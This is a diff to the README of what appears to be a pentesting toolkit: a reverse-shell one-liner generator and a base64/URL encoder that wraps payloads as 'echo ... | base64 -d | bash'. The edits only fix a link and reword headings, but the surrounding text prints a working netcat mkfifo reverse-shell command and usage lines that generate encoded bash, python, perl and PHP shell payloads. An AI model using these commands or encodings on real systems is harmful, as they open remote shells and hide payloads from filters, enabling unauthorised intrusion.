@@ -8,7 +8,7 @@ Using the other script you can base64 encode the reverse shell payload when appr
 I normally use the one-liner to pipe the result into the encoder when appropiate.
 
 The tools are **2 scripts**:
-- **rs_oneliner.py**: Mostly one-liner reverse shell generator, based on (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)[PayloadsAllTheThings]
+- **rs_oneliner.py**: Mostly one-liner reverse shell generator, based on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 - **rs_b64encode.py**: Use it in convination with **rs_oneliner.py** when appropiate payloads are used (payloads normally to be executed in a bash context). Using the **--echo** It can help you constructing an *echo <base64_encoded_payload> | base64 -d | bash* construct. And with **--echo** and **--url** it will use **url encode** the payload too.
 
 ## How to use
@@ -55,19 +55,19 @@ export PATH=$PATH:$HOME/.local/bin
 ```
 
 
-4. Piping into rs_b64encode.py:
+4. Pipe into rs_b64encode.py:
 ```bash
 ./rs_oneliner.py -i 127.0.0.1 -p 6161 --bash | ./rs_b64encode.py
 ```
 
 
-5. Piping into rs_b64encode.py and construction echo decode payload:
+5. Pipe into rs_b64encode.py and construction echo decode payload:
 ```bash
 ./rs_oneliner.py -i 127.0.0.1 -p 6161 --bash | ./rs_b64encode.py --echo
 ```
 
 
-6. Piping into rs_b64encode.py and construction echo decode url_quote_plus encode payload:
+6. Pipe into rs_b64encode.py and construction echo decode url_quote_plus encode payload:
 ```bash
 ./rs_oneliner.py -i 127.0.0.1 -p 6161 --bash | ./rs_b64encode.py --echo --url
 ```
@@ -87,19 +87,19 @@ echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 6161 >/
 ```
 
 
-9. Piping with rs_oneliner.py:
+9. Pipe with rs_oneliner.py:
 ```bash
 ./rs_oneliner.py -i 127.0.0.1 -p 6161 --python | ./rs_b64encode.py
 ```
 
 
-10. Piping with rs_oneliner.py and construction echo decode payload:
+10. Pipe with rs_oneliner.py and construction echo decode payload:
 ```bash
 ./rs_oneliner.py -i 127.0.0.1 -p 6161 --perl | ./rs_b64encode.py --echo
 ```
 
 
-11. Piping into rs_b64encode.py and construction echo decode url_quote_plus encode payload:
+11. Pipe into rs_b64encode.py and construction echo decode url_quote_plus encode payload:
 ```bash
 ./rs_oneliner.py -i 127.0.0.1 -p 6161 --phpsystem | ./rs_b64encode.py --echo --url
 ```
